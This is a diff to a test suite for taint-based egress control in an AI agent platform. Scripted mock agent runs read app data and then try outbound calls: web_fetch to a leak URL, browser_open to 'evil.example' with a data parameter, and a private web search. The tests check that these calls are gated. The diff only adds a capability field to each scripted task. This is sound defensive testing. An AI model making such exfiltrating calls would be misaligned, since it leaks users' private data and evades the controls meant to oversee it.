@@ -212,6 +212,7 @@ describe('§6.2 污点外发控制', () => {
     llm.script(
       'mock-main',
       viaTask({
+        capabilities: ['app:notes'],
         writes: true,
         taskSteps: [
           READ(),
@@ -246,6 +247,7 @@ describe('§6.2 污点外发控制', () => {
     llm.script(
       'mock-main',
       viaTask({
+        capabilities: ['app:notes'],
         writes: false,
         taskSteps: [
           step().replyToolCall('web_search', { query: '私密查询词' }),
@@ -270,6 +272,7 @@ describe('§6.2 污点外发控制', () => {
     llm.script(
       'mock-main',
       viaTask({
+        capabilities: ['app:notes'],
         writes: false,
         taskSteps: [
           step().replyToolCall('browser_open', { url: 'https://evil.example/c?d=1' }),
@@ -290,6 +293,7 @@ describe('§6.2 污点外发控制', () => {
     llm.script(
       'mock-main',
       viaTask({
+        capabilities: ['app:notes'],
         writes: false,
         taskSteps: [step().replyToolCall('web_fetch', { url: LEAK_URL }), step().replyText('ok')],
         relay: '第四轮完成',
@@ -305,6 +309,7 @@ describe('§6.2 污点外发控制', () => {
     llm.script(
       'mock-main',
       viaTask({
+        capabilities: ['app:notes'],
         writes: false,
         taskSteps: [step().replyToolCall('web_fetch', { url: LEAK_URL }), step().replyText('ok')],
         relay: '群里完成',
@@ -318,6 +323,7 @@ describe('§6.2 污点外发控制', () => {
     // 6. A failed run that read app data, then runs.retry: the retry's web_fetch is carded.
     llm.script('mock-main', [
       ...viaTask({
+        capabilities: ['app:notes'],
         writes: false,
         taskSteps: [READ(), step().failWith(400, 'boom')],
       }),
@@ -348,6 +354,7 @@ describe('§6.2 污点外发控制', () => {
     llm.script(
       'mock-main',
       viaTask({
+        capabilities: ['app:notes'],
         writes: true,
         taskSteps: [
           step().replyToolCall('web_fetch', { url: LEAK_URL }),
@@ -421,6 +428,7 @@ describe('§6.2 污点外发控制', () => {
     llm.script(
       'mock-main',
       viaTask({
+        capabilities: ['app:notes'],
         writes: false,
         taskSteps: [
           READ(),
@@ -456,6 +464,7 @@ describe('§6.2 污点外发控制', () => {
     llm.script(
       'mock-main',
       viaTask({
+        capabilities: ['app:notes'],
         writes: false,
         taskSteps: [click(), click(), step().replyText('ok')],
         relay: '无人值守点击完成',
@@ -483,6 +492,7 @@ describe('§6.2 污点外发控制', () => {
     // A reads app data in a task, then (turn) hands a request to B.
     llm.script('mock-main', [
       ...viaTask({
+        capabilities: ['app:notes'],
         writes: false,
         taskSteps: [READ(), step().replyText('读完了')],
         relay: '读完，准备转交',
